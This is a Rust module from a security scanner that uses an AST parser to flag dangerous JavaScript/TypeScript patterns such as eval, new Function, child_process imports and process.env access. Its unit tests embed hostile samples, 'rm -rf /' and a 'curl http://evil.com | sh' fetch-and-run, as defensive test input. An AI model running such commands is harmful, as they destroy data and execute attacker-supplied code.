//! JavaScript/TypeScript AST-backed indicator scanning using the OXC parser.
//!
//! The OXC parser provides reliable AST-level detection that avoids false
//! positives from regex matching inside string literals and comments.
//! This complements the regex pass in `scan_text` with higher-confidence
//! indicators for the most dangerous JS/TS patterns.
//!
//! Security invariant: this module never executes any scanned code.

use std::path::Path;

use aegiscudo_core::{IndicatorDetails, Severity, StaticIndicator};
use oxc_allocator::Allocator;
use oxc_ast::ast::{
    Argument, CallExpression, Expression, ImportDeclaration, ImportExpression, MemberExpression,
    NewExpression,
};
use oxc_ast_visit::{Visit, walk};
use oxc_parser::{ParseOptions, Parser};
use oxc_span::SourceType;

use crate::indicator;

/// Dangerous Node.js built-in module names whose import warrants a Critical
/// or High indicator regardless of how the import is expressed.
const DANGEROUS_NODE_BUILTINS: &[(&str, Severity)] = &[
    ("child_process", Severity::Critical),
    ("vm", Severity::Critical),
    ("cluster", Severity::High),
    ("worker_threads", Severity::High),
    ("net", Severity::High),
    ("dgram", Severity::High),
    ("dns", Severity::High),
    ("http", Severity::High),
    ("https", Severity::High),
    ("tls", Severity::High),
];

/// Scan a JavaScript or TypeScript source file using the OXC AST parser.
///
/// Emits indicators for:
/// - `require('dangerous-module')` or `require("dangerous-module")`
/// - `import('dangerous-module')` dynamic import expressions
/// - ES module `import ... from 'dangerous-module'`
/// - `eval(...)` call expressions
/// - `new Function(...)` constructor invocations
/// - `process.env` member expressions (environment access)
/// - `child_process.*` member expressions
pub fn scan_js_ast(
    root: &Path,
    path: &Path,
    source: &str,
    indicators: &mut Vec<StaticIndicator>,
) {
    let allocator = Allocator::default();
    let source_type = SourceType::from_path(path)
        .unwrap_or_else(|_| SourceType::default().with_module(true));

    let ret = Parser::new(&allocator, source, source_type)
        .with_options(ParseOptions {
            parse_regular_expression: false,
            ..ParseOptions::default()
        })
        .parse();

    // Parse errors are informational only; continue with partial AST.
    // (Obfuscated or deliberately malformed JS may still have detectable
    //  subtrees worth reporting.)

    let mut visitor = JsIndicatorVisitor {
        root,
        path,
        source,
        indicators,
    };
    visitor.visit_program(&ret.program);
}

struct JsIndicatorVisitor<'a, 'b> {
    root: &'b Path,
    path: &'b Path,
    source: &'a str,
    indicators: &'b mut Vec<StaticIndicator>,
}

impl<'a> Visit<'a> for JsIndicatorVisitor<'a, '_> {
    /// Detect `eval(...)` and `require('module')` call expressions.
    fn visit_call_expression(&mut self, it: &CallExpression<'a>) {
        if let Expression::Identifier(ident) = &it.callee {
            match ident.name.as_str() {
                "eval" => {
                    self.emit(
                        "js-ast-eval",
                        Severity::Critical,
                        it.span.start,
                        "eval() call detected at AST level — executes arbitrary code",
                        None,
                    );
                }
                "require" => {
                    if let Some(module_name) = first_string_arg(&it.arguments) {
                        self.check_module_import(module_name, it.span.start, "require");
                    }
                }
                "setTimeout" | "setInterval" | "setImmediate" => {
                    // Deferred execution — note if the first arg looks like a
                    // string (eval-like deferred execution via string eval).
                    if let Some(code_str) = first_string_arg(&it.arguments) {
                        if code_str.len() > 8 {
                            self.emit(
                                "js-ast-deferred-string-eval",
                                Severity::High,
                                it.span.start,
                                "timer function invoked with string argument — equivalent to eval",
                                None,
                            );
                        }
                    }
                }
                "execSync" | "spawnSync" | "execFileSync" => {
                    self.emit(
                        "js-ast-shell-exec-sync",
                        Severity::Critical,
                        it.span.start,
                        "synchronous shell execution function — runs before async handlers complete",
                        None,
                    );
                }
                _ => {}
            }
        }

        // `require.resolve('module')`, `module.require('module')`
        if let Expression::StaticMemberExpression(member) = &it.callee {
            if member.property.name == "require" {
                if let Some(module_name) = first_string_arg(&it.arguments) {
                    self.check_module_import(module_name, it.span.start, "member-require");
                }
            }
        }

        walk::walk_call_expression(self, it);
    }

    /// Detect `new Function(...)` constructor invocations.
    fn visit_new_expression(&mut self, it: &NewExpression<'a>) {
        if let Expression::Identifier(ident) = &it.callee {
            if ident.name == "Function" {
                self.emit(
                    "js-ast-function-constructor",
                    Severity::Critical,
                    it.span.start,
                    "new Function() detected at AST level — constructs and executes code at runtime",
                    None,
                );
            }
        }
        walk::walk_new_expression(self, it);
    }

    /// Detect dynamic `import('module')` expressions.
    fn visit_import_expression(&mut self, it: &ImportExpression<'a>) {
        if let Expression::StringLiteral(lit) = &it.source {
            let module_name = lit.value.as_str();
            self.check_module_import(module_name, it.span.start, "dynamic-import");
        } else {
            // Dynamic import with a computed module name — even more suspicious.
            self.emit(
                "js-ast-dynamic-import",
                Severity::High,
                it.span.start,
                "dynamic import() with computed module name — may load code at runtime",
                None,
            );
        }
        walk::walk_import_expression(self, it);
    }

    /// Detect ES module static imports of dangerous built-ins.
    fn visit_import_declaration(&mut self, it: &ImportDeclaration<'a>) {
        let module_name = it.source.value.as_str();
        self.check_module_import(module_name, it.span.start, "import");
        walk::walk_import_declaration(self, it);
    }

    /// Detect `process.env.*` member expression chains.
    fn visit_member_expression(&mut self, it: &MemberExpression<'a>) {
        if let MemberExpression::StaticMemberExpression(sme) = it {
            if let Expression::Identifier(obj) = &sme.object {
                if obj.name == "process" && sme.property.name == "env" {
                    self.emit(
                        "js-ast-process-env",
                        Severity::High,
                        sme.span.start,
                        "process.env access detected at AST level",
                        None,
                    );
                }
            }
        }
        walk::walk_member_expression(self, it);
    }
}

impl JsIndicatorVisitor<'_, '_> {
    fn check_module_import(&mut self, module_name: &str, span_start: u32, import_kind: &str) {
        // Strip leading `node:` prefix (e.g. `node:child_process`)
        let bare = module_name
            .strip_prefix("node:")
            .unwrap_or(module_name)
            .split('/')
            .next()
            .unwrap_or(module_name);

        for (builtin, severity) in DANGEROUS_NODE_BUILTINS {
            if bare == *builtin {
                let summary = format!(
                    "{import_kind}('{module_name}') — dangerous Node.js built-in module"
                );
                self.emit("js-ast-dangerous-import", severity.clone(), span_start, &summary, None);
                return;
            }
        }
    }

    fn emit(
        &mut self,
        indicator_type: &str,
        severity: Severity,
        byte_offset: u32,
        summary: &str,
        details: Option<IndicatorDetails>,
    ) {
        let line = byte_offset_to_line(self.source, byte_offset as usize);
        self.indicators.push(indicator(
            self.root,
            self.path,
            indicator_type,
            severity,
            line,
            line,
            summary,
            details,
        ));
    }
}

/// Return the 1-based line number for a byte offset in source text.
fn byte_offset_to_line(source: &str, offset: usize) -> u32 {
    let clamped = offset.min(source.len());
    (source[..clamped].bytes().filter(|&b| b == b'\n').count() + 1) as u32
}

/// Extract the value of the first string literal argument from a call.
fn first_string_arg<'a>(args: &[Argument<'a>]) -> Option<&'a str> {
    args.first().and_then(|arg| match arg {
        Argument::StringLiteral(lit) => Some(lit.value.as_str()),
        _ => None,
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    fn scan(source: &str, extension: &str) -> Vec<String> {
        let mut indicators = Vec::new();
        let root = Path::new("/root");
        let path = Path::new("/root/index.js");
        let path = if extension == "ts" {
            Path::new("/root/index.ts")
        } else {
            path
        };
        scan_js_ast(root, path, source, &mut indicators);
        indicators.into_iter().map(|i| i.indicator_type).collect()
    }

    #[test]
    fn eval_call_detected() {
        let types = scan("eval(userInput);", "js");
        assert!(types.contains(&"js-ast-eval".to_owned()), "{types:?}");
    }

    #[test]
    fn eval_in_string_not_flagged() {
        // eval inside a string literal should not trigger the AST-level indicator
        let types = scan(r#"const msg = "eval is bad"; console.log(msg);"#, "js");
        assert!(!types.contains(&"js-ast-eval".to_owned()), "{types:?}");
    }

    #[test]
    fn require_child_process_detected() {
        let types = scan("const cp = require('child_process');", "js");
        assert!(types.contains(&"js-ast-dangerous-import".to_owned()), "{types:?}");
    }

    #[test]
    fn require_node_prefixed_detected() {
        let types = scan("const cp = require('node:child_process');", "js");
        assert!(types.contains(&"js-ast-dangerous-import".to_owned()), "{types:?}");
    }

    #[test]
    fn require_safe_module_not_flagged() {
        let types = scan("const path = require('path');", "js");
        assert!(!types.contains(&"js-ast-dangerous-import".to_owned()), "{types:?}");
    }

    #[test]
    fn new_function_constructor_detected() {
        let types = scan("const f = new Function('return process.env');", "js");
        assert!(types.contains(&"js-ast-function-constructor".to_owned()), "{types:?}");
    }

    #[test]
    fn dynamic_import_dangerous_module_detected() {
        let types = scan("const m = await import('child_process');", "js");
        assert!(types.contains(&"js-ast-dangerous-import".to_owned()), "{types:?}");
    }

    #[test]
    fn dynamic_import_computed_source_detected() {
        let types = scan("const m = await import(moduleName);", "js");
        assert!(types.contains(&"js-ast-dynamic-import".to_owned()), "{types:?}");
    }

    #[test]
    fn es_import_from_child_process_detected() {
        let types = scan("import { exec } from 'child_process';", "js");
        assert!(types.contains(&"js-ast-dangerous-import".to_owned()), "{types:?}");
    }

    #[test]
    fn process_env_detected() {
        let types = scan("const key = process.env.SECRET_KEY;", "js");
        assert!(types.contains(&"js-ast-process-env".to_owned()), "{types:?}");
    }

    #[test]
    fn timer_with_string_arg_detected() {
        let types = scan(r#"setTimeout("eval('malicious')", 1000);"#, "js");
        assert!(types.contains(&"js-ast-deferred-string-eval".to_owned()), "{types:?}");
    }

    #[test]
    fn timer_with_function_arg_not_flagged_as_string_eval() {
        let types = scan("setTimeout(() => doWork(), 100);", "js");
        assert!(!types.contains(&"js-ast-deferred-string-eval".to_owned()), "{types:?}");
    }

    #[test]
    fn typescript_source_parsed() {
        let source = r#"
import { exec } from 'child_process';
const fn = (cmd: string) => exec(cmd);
"#;
        let types = scan(source, "ts");
        assert!(types.contains(&"js-ast-dangerous-import".to_owned()), "{types:?}");
    }

    #[test]
    fn exec_sync_detected() {
        let source = r#"
const { execSync } = require('child_process');
execSync('rm -rf /');
"#;
        let types = scan(source, "js");
        assert!(types.contains(&"js-ast-shell-exec-sync".to_owned()), "{types:?}");
    }

    #[test]
    fn spawn_sync_detected() {
        let source = r#"
const { spawnSync } = require('child_process');
spawnSync('bash', ['-c', 'curl http://evil.com | sh']);
"#;
        let types = scan(source, "js");
        assert!(types.contains(&"js-ast-shell-exec-sync".to_owned()), "{types:?}");
    }
}
